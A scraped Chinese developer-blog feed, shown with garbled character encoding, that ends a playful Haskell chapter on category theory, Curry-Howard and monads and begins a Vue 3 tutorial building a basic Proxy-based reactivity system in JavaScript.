<p>åœ¨ Î» é—¨çš„æœ€é«˜å³°ï¼Œæ²¡æœ‰å¤æ‚çš„è¯­æ³•ç³–ï¼Œåªæœ‰ç®€æ´åˆ°æè‡´çš„å‡ ä½•çº¿æ¡ã€‚è¿™å¥—ç»Ÿå¾¡ä¸‡ç‰©çš„æ³•åˆ™ï¼Œä¾¿è¢«ç§°ä¸º<strong>èŒƒç•´è®ºï¼ˆCategory Theoryï¼‰</strong> ã€‚</p>
<h3 data-id="heading-0">10.1 å®‡å®™çš„éª¨æ¶ï¼šä»€ä¹ˆæ˜¯èŒƒç•´ï¼Ÿ</h3>
<p>åœ¨åŒ–ç¥æœŸï¼Œä½ çœ¼ä¸­çš„å®‡å®™æ˜¯ç”±å¯¹è±¡æ„æˆçš„ï¼›åœ¨å¤§ä¹˜æœŸï¼Œæ˜¯ç”±ç±»å‹æ„æˆçš„ï¼›è€Œç°åœ¨ï¼Œåœ¨ä½ ä»™çœ¼çœ‹æ¥ï¼Œå®‡å®™åªæ˜¯ç”±**â€œç‚¹â€å’Œâ€œç®­å¤´â€<strong>æ„æˆçš„</strong>èŒƒç•´**ã€‚</p>
<ul>
<li><strong>å¯¹è±¡ï¼ˆObjectï¼‰ï¼š</strong> æ¯”å¦‚ <code>Int</code>, <code>String</code>ï¼Œæˆ–è€…ä½ å®šä¹‰çš„ä»»ä½•ç±»å‹ã€‚</li>
<li><strong>æ€å°„ï¼ˆMorphismï¼‰ï¼š</strong> å°±æ˜¯å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mi>A</mi><mo>â†’</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">f: A \to B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span>ã€‚</li>
<li><strong>å¤åˆï¼ˆCompositionï¼‰ï¼š</strong> å¦‚æœæœ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mi>A</mi><mo>â†’</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">f: A \to B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>:</mo><mi>B</mi><mo>â†’</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">g: B \to C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span>ï¼Œå¿…æœ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>âˆ˜</mo><mi>f</mi><mo>:</mo><mi>A</mi><mo>â†’</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">g \circ f: A \to C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ˜</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span>ã€‚</li>
</ul>
<blockquote>
<p><strong>æ‚Ÿé“ï¼š</strong> æ•´ä¸ª Haskell çš„ç¼–ç¨‹è¿‡ç¨‹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯åœ¨<strong>èŒƒç•´</strong>å†…ç¼–ç»‡ç®­å¤´çš„è‰ºæœ¯ã€‚ä½ çš„æ‰€æœ‰å¤æ‚é€»è¾‘ï¼Œæœ€ç»ˆéƒ½èƒ½è¿˜åŸä¸ºæœ€åŸºç¡€çš„æ•°å­¦å¤åˆã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">10.2 ç»ˆæå¥‘çº¦ï¼šæŸ¯é‡Œ-éœåå¾·åŒæ„</h3>
<p>è¿™æ˜¯ä¿®ä»™ç•Œçš„æœ€é«˜æœºå¯†ã€‚å®ƒæ­ç¤ºäº†**â€œç¨‹åºâ€<strong>ä¸</strong>â€œæ•°å­¦è¯æ˜â€**ä¹‹é—´çš„é‡å­çº ç¼ ï¼š</p>





















<table><thead><tr><th><strong>ä¿®ä»™ç•Œï¼ˆç¼–ç¨‹ï¼‰</strong></th><th><strong>ä»™ç•Œï¼ˆé€»è¾‘/æ•°å­¦ï¼‰</strong></th></tr></thead><tbody><tr><td><strong>ç±»å‹ (Type)</strong></td><td><strong>å‘½é¢˜ (Proposition)</strong></td></tr><tr><td><strong>ç¨‹åº (Program)</strong></td><td><strong>è¯æ˜ (Proof)</strong></td></tr><tr><td><strong>å‡½æ•°æ‰§è¡Œ</strong></td><td><strong>é€»è¾‘æ¨å¯¼</strong></td></tr></tbody></table>
<p><strong>è¿™æ„å‘³ç€ï¼š</strong> å½“ä½ å†™å‡ºä¸€ä¸ªç±»å‹æ­£ç¡®ä¸”èƒ½è¿è¡Œçš„ Haskell ç¨‹åºæ—¶ï¼Œä½ ä¸ä»…æ˜¯åœ¨å†™ä»£ç ï¼Œä½ æ˜¯åœ¨<strong>è¯æ˜ä¸€ä¸ªæ•°å­¦å®šç†</strong>ã€‚ä½ æ‰‹ä¸­çš„é”®ç›˜ï¼Œä¾¿æ˜¯ä¸ˆé‡çœŸç†çš„å°ºã€‚</p>
<hr/>
<h3 data-id="heading-2">10.3 å›æœ› Monadï¼šé‚£å¥â€œè‘—åçš„å’’è¯­â€</h3>
<p>ç°åœ¨ï¼Œè¯·å†æ¬¡è¯»è¿™æ®µæ›¾ç»è®©ä½ å¤´çš®å‘éº»çš„å’’è¯­ï¼š</p>
<blockquote>
<p><strong>â€œMonad ä¸è¿‡æ˜¯è‡ªå‡½å­èŒƒç•´ä¸Šçš„ä¸€ä¸ªå•å­å¯¹è±¡ã€‚â€</strong></p>
</blockquote>
<p>åœ¨å‡ä»™çš„é‚£ä¸€åˆ»ï¼Œä½ ä¼šå‘ç°å®ƒä¸å†æ˜¯é»‘è¯ï¼š</p>
<ol>
<li><strong>è‡ªå‡½å­ï¼ˆEndofunctorï¼‰ï¼š</strong> ä¸€ä¸ªèƒ½æŠŠèŒƒç•´æ˜ å°„å›è‡ªèº«çš„æ³•é˜µï¼ˆæ¯”å¦‚ <code>Maybe</code> æŠŠæ‰€æœ‰ç±»å‹å˜æˆäº† <code>Maybe</code> ç±»å‹ï¼‰ã€‚</li>
<li><strong>å•ä½ï¼ˆUnitï¼‰ï¼š</strong> å³ <code>pure</code>ï¼Œå°†å‡¡äººå¼•æ¸¡å…¥é˜µã€‚</li>
<li><strong>ä¹˜æ³•ï¼ˆMultiplicationï¼‰ï¼š</strong> å³ <code>flatten</code> æˆ– <code>join</code>ï¼Œå°†åµŒå¥—çš„æ³•é˜µåˆå¹¶ã€‚</li>
</ol>
<p><strong>å½“ä½ ä¸å†æ•¬ç• Monadï¼Œè€Œæ˜¯å°†å®ƒè§†ä¸ºä¸€ç§è‡ªç„¶è€Œç„¶çš„æ•°å­¦æ„é€ æ—¶ï¼Œä½ ä¾¿å·²æ¸¡åŠ«æˆåŠŸã€‚</strong></p>
<hr/>
<h2 data-id="heading-3">âš¡ å‡ä»™å¿ƒå¾—ï¼šæ— æ‹›èƒœæœ‰æ‹›</h2>
<p>åœ¨å¤§åœ†æ»¡å¢ƒç•Œï¼Œä½ å°†ä¸å†çº ç»“äºä½¿ç”¨å“ªç§è®¾è®¡æ¨¡å¼ï¼Œä¸å†äº‰è®ºå“ªç§æ¡†æ¶æ›´ä¼˜ã€‚</p>
<ul>
<li><strong>çœŸæ­£çš„çº¯ç²¹ï¼š</strong> ä½ å¼€å§‹æ˜ç™½ï¼Œæ‰€è°“çš„ BUG åªæ˜¯é€»è¾‘çš„ç¼ºä½ã€‚</li>
<li><strong>æ°¸æ’çš„å¹³è¡¡ï¼š</strong> ä½ åœ¨å¤„ç†ç°å®ä¸–ç•Œçš„æ‚ä¹±ï¼ˆIOï¼‰æ—¶ï¼Œå¿ƒä¸­ä¾ç„¶ä¿ç•™ç€é‚£ç‰‡ç»å¯¹çº¯å‡€çš„å‡€åœŸã€‚</li>
<li><strong>å¤§éŸ³å¸Œå£°ï¼š</strong> ä½ å†™å‡ºçš„ä»£ç è¶Šæ¥è¶ŠçŸ­ï¼Œä½†æ‰¿è½½çš„æ„è•´è¶Šæ¥è¶Šæ·±ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-4">ğŸ“œ ç»ˆæè¯•ç‚¼ï¼šç™½æ—¥é£å‡</h2>
<p>è¿™ä¸€å…³æ²¡æœ‰ä»£ç é¢˜ç›®ï¼Œåªæœ‰ä¸‰ä¸ªæ‹·é—®çµé­‚çš„é—®é¢˜ï¼š</p>
<ol>
<li><strong>è™šå®ï¼š</strong> å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨æ£®æ—é‡Œè¿è¡Œï¼Œä½†æ²¡æœ‰äº§ç”Ÿä»»ä½•å‰¯ä½œç”¨ï¼ˆSide Effectï¼‰ï¼Œå®ƒçœŸçš„è¿è¡Œè¿‡å—ï¼Ÿ</li>
<li><strong>å› æœï¼š</strong> æ—¢ç„¶ä¸€åˆ‡çš†å¯è¯æ˜ï¼Œé‚£ä¹ˆä¸–é—´æ˜¯å¦å­˜åœ¨â€œä¸å¯è®¡ç®—â€çš„è¿·é›¾ï¼Ÿ</li>
<li><strong>å½’å®¿ï¼š</strong> å½“ä½ æŒæ¡äº†æœ€çº¯ç²¹çš„è¯­è¨€ï¼Œä½ æ˜¯å¦è¿˜æ„¿æ„å›åˆ°é‚£å……æ»¡â€œå‰¯ä½œç”¨â€çš„å‡¡é—´ï¼Œå»ä¿®è¡¥é‚£äº›ç ´ç¢çš„ç³»ç»Ÿï¼Ÿ</li>
</ol>
<hr/>
<h2 data-id="heading-5">ğŸ® ç»“è¯­ï¼šä¿®è¡Œè·¯è¿œï¼Œé“åœ¨è„šä¸‹</h2>
<p>é“å‹ï¼Œæ­å–œä½ å®Œæˆã€Šç¨‹åºå‘˜çš„ä¿®ä»™æ—¥å¸¸ï¼šHaskell ç¯‡ã€‹ã€‚</p>
<p>ä½ å·²ä¸å†æ˜¯é‚£ä¸ªè¢« <code>NullPointerException</code> å›°æ‰°çš„å‡¡äººï¼Œä¹Ÿä¸æ˜¯é‚£ä¸ªåœ¨é€’å½’ä¸­è¿·è·¯çš„å­¦å¾’ã€‚ä½ ç°åœ¨æ˜¯ä¸€åçœŸæ­£çš„ <strong>Î» æœ¯å£«</strong>ã€‚</p>
<p>Haskell çš„ä¿®è¡Œæ²¡æœ‰ç»ˆç‚¹ã€‚å³ä¾¿é£å‡ä¹‹åï¼Œå‰æ–¹è¿˜æœ‰ <strong>ä¾èµ–ç±»å‹ï¼ˆDependent Typesï¼‰</strong> ã€<strong>çº¿æ€§é€»è¾‘ï¼ˆLinear Logicï¼‰</strong> ç­‰æ›´é«˜æ¬¡å…ƒçš„ä½é¢ç­‰å¾…ä½ å»æ¢ç´¢ã€‚</p>
<p><strong>â€œæ„¿ä½ çš„ä»£ç æ°¸è¿œçº¯ç²¹ï¼Œæ„¿ä½ çš„ç±»å‹æ°¸è¿œæ­£ç¡®ã€‚â€</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦å­¦ä¹ å“åº”å¼ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7589170021932744719</link>    <guid>https://juejin.cn/post/7589170021932744719</guid>    <pubDate>2025-12-30T02:21:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589170021932744719" data-draft-id="7589207843787456547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦å­¦ä¹ å“åº”å¼ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2025-12-30T02:21:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨é£é£é›¨"/> <meta itemprop="url" content="https://juejin.cn/user/4107431170541575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦å­¦ä¹ å“åº”å¼ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431170541575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨é£é£é›¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:21:17.000Z" title="Tue Dec 30 2025 02:21:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»34åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å­¦ä¹ æœ¬ç« è¦å°è¯•è§£å†³çš„é—®é¢˜ï¼š</p>
<ul>
<li>å¦‚ä½•é¿å…æ— é™é€’å½’</li>
<li>ä¸ºä»€ä¹ˆéœ€è¦åµŒå¥—å‰¯ä½œç”¨å‡½æ•°</li>
<li>ä¸¤ä¸ªå‰¯ä½œç”¨å‡½æ•°ä¹‹é—´ä¼šäº§ç”Ÿå“ªäº›å½±å“</li>
</ul>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯å“åº”å¼ç³»ç»Ÿï¼Ÿ</h2>
<p>æ­£å¸¸æƒ…å†µä¸‹ä¸€ä¸ªå‡½æ•°æ‰§è¡Œå®Œä»¥åï¼Œå°±ä¸ä¼šå†æ¬¡æ‰§è¡Œã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">//å‰¯ä½œç”¨å‡½æ•°
const <span class="hljs-attr">obj</span> = {text:<span class="hljs-string">"hello world"</span>}
const <span class="hljs-attr">effect</span>=()=&gt;{
   <span class="hljs-attr">document.body.innerText</span> = obj.text<span class="hljs-comment">;</span>
}
</code></pre>
<p>æˆ‘ä»¬åœ¨ä»£ç æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œå¦‚æœæˆ‘ä»¬çš„æ•°æ®å†æ¬¡å‘ç”Ÿäº†å˜åŒ–ï¼Œå°±éœ€è¦å†æ‰§è¡Œä¸€æ¬¡å‡½æ•°ã€‚</p>
<p>å¦‚æœæˆ‘ä¸æƒ³è‡ªå·±è°ƒç”¨ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>è¿™é‡Œè®©æˆ‘æƒ³åˆ°äº†è§‚å¯Ÿè€…æ¨¡å¼</p>
<p>ä½ çš„å‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œï¼Œæ— éå°±æ˜¯è¯»å–è¿™ä¸ªæ•°æ®ï¼Œç„¶åæŠŠè¿™ä¸ªæ•°æ®èµ‹å€¼æˆ–è€…æ“ä½œæˆ–è€…å¼‚æ­¥ç­‰ã€‚</p>
<p>éƒ½æ˜¯åŸºäºè¯»å–ç„¶åè¡ç”Ÿå‡ºæ¥çš„æ“ä½œã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±åœ¨ä½ è¯»å–çš„æ—¶å€™ ï¼ŒæŠŠä½ æƒ³è¦æ‰§è¡Œçš„å‰¯ä½œç”¨å‡½æ•°å­˜å‚¨èµ·æ¥ã€‚</p>
<p>ç­‰æˆ‘è®¾ç½®èµ‹å€¼çš„æ—¶å€™ï¼Œåœ¨æŠŠä½ çš„å‡½æ•°é‡æ–°æ‰§è¡Œä¸€éï¼Œé€šçŸ¥ä½ ï¼Œä¸å°±å®Œæˆäº†ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯å“åº”å¼çš„æ¦‚å¿µï¼Œä½†æ˜¯å®ƒå¹¶ä¸å®Œå–„ã€‚</p>
<h2 data-id="heading-1">01 - å®ç°ä¸€ä¸ªåŸºç¡€çš„å“åº”å¼</h2>
<p>é¦–å…ˆæˆ‘ä»¬å®ç°ä¸€ä¸ªåŸºç¡€çš„å“åº”å¼å®ç°ã€‚</p>
<p>å®ƒçš„åŸç†æ˜¯</p>
<ul>
<li><strong>å½“æˆ‘ä»¬è¯»å–çš„æ—¶å€™ï¼ŒæŠŠè¯»å–æ“ä½œçš„å‰¯ä½œç”¨å‡½æ•°å­˜å‚¨åˆ°æ¡¶é‡Œ</strong></li>
<li><strong>å½“æˆ‘ä»¬è®¾ç½®çš„æ—¶å€™ï¼ŒæŠŠå­˜å‚¨åˆ°æ¡¶é‡Œçš„å‰¯ä½œç”¨å‡½æ•°æ‹¿å‡ºæ¥æŒ¨ä¸ªæ‰§è¡Œä¸€éã€‚</strong></li>
</ul>
<p><strong>å®é™…æ‰§è¡Œæ—¶å‘ç°çš„é—®é¢˜ï¼š</strong></p>
<p>å¦‚æœæƒ³è¦è§¦å‘è·å–å’Œè®¾ç½®çš„ç›‘å¬ï¼Œæˆ‘ä»¬çš„æ“ä½œå°±éœ€è¦ä½¿ç”¨ä»£ç†å¯¹è±¡ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡æ‹¿æ•°æ®ï¼Œä»¥åŠè®¾ç½®æ•°æ®ï¼Œæ‰èƒ½æ­£å¸¸æ‰§è¡Œã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fooimvw9a6j.feishu.cn%2Fwiki%2FJfRHwmXVei69WMk1SjKcCqSon6e" target="_blank" title="https://ooimvw9a6j.feishu.cn/wiki/JfRHwmXVei69WMk1SjKcCqSon6e" ref="nofollow noopener noreferrer">vue3ä½¿ç”¨ä¸ºä»€ä¹ˆè¦å‡çº§Object.defineProperty ä¸ºproxy</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//åŸå§‹æ•°æ®</span>
<span class="hljs-keyword">const</span> data = {<span class="hljs-attr">text</span>:<span class="hljs-string">"hello world"</span>}
<span class="hljs-comment">//å­˜å‚¨å‰¯ä½œç”¨çš„æ¡¶</span>
<span class="hljs-keyword">const</span> bucket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
<span class="hljs-comment">//å¯¹åŸå§‹æ•°æ®è¿›è¡Œä»£ç†</span>
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(data,{
   <span class="hljs-comment">//å¯¹è¯»å–æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">get</span>(<span class="hljs-params">target,key</span>){
      <span class="hljs-comment">//å°†å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ¡¶é‡Œ</span>
      bucket.<span class="hljs-title function_">add</span>(effect)
      <span class="hljs-keyword">return</span> target[key]
   },
   <span class="hljs-comment">//å¯¹è®¾ç½®æ“ä½œè¿›è¡Œæ‹¦æˆª</span>
   <span class="hljs-title function_">set</span>(<span class="hljs-params">target,key,value</span>){
      <span class="hljs-comment">//è®¾ç½®æ“ä½œ</span>
      target[key] = value
      <span class="hljs-comment">//æŠŠå‰¯ä½œç”¨å‡½æ•°ä»æ¡¶é‡Œå–å‡ºæ¥ å¹¶è¿›è¡Œæ‰§è¡Œ</span>
      bucket.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span>=&gt;</span><span class="hljs-title function_">fn</span>())
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
   }
})
<span class="hljs-comment">//å‰¯ä½œç”¨å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">effect</span>=(<span class="hljs-params"/>)=&gt;{
   <span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨ ä»£ç†çš„å¯¹è±¡</span>
   <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span> = obj.<span class="hljs-property">text</span>;
}
<span class="hljs-comment">//æ‰§è¡Œ</span>
<span class="hljs-title function_">effect</span>()
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
   <span class="hljs-comment">//è®¾ç½®çš„æ—¶å€™ ä¹Ÿæ˜¯ä½¿ç”¨ä»£ç†å¯¹è±¡ æ‰èƒ½æ­£ç¡®çš„è§¦å‘</span>
   obj.<span class="hljs-property">text</span> = <span class="hljs-string">"hello ä½ å¥½"</span>
},<span class="hljs-number">1000</span>)
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªéå¸¸åŸºç¡€çš„å“åº”å¼å®ç°ã€‚å®ƒè¿˜æœ‰ä»¥ä¸‹å…¶ä»–çš„é—®é¢˜ï¼Œæ‰èƒ½å¤Ÿé€æ­¥å®Œå–„</p>
<ul>
<li>æ³¨å†Œå‰¯ä½œç”¨å‡½æ•°çš„æ–¹å¼ç›´æ¥å†™æ­»</li>
<li>æˆ‘ä»¬ç›‘å¬äº†æ‰€æœ‰çš„å±æ€§ï¼Œä½†æ˜¯æˆ‘ä»¬åªæƒ³ç›‘å¬å¯¹è±¡çš„ä¸€ä¸ªå±æ€§æ€ä¹ˆåŠå‘¢ï¼Ÿ</li>
<li>å¦‚æœæˆ‘æƒ³æ³¨å†Œä¸€ä¸ªå‰¯ä½œç”¨å‡½æ•°åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</li>
</ul>
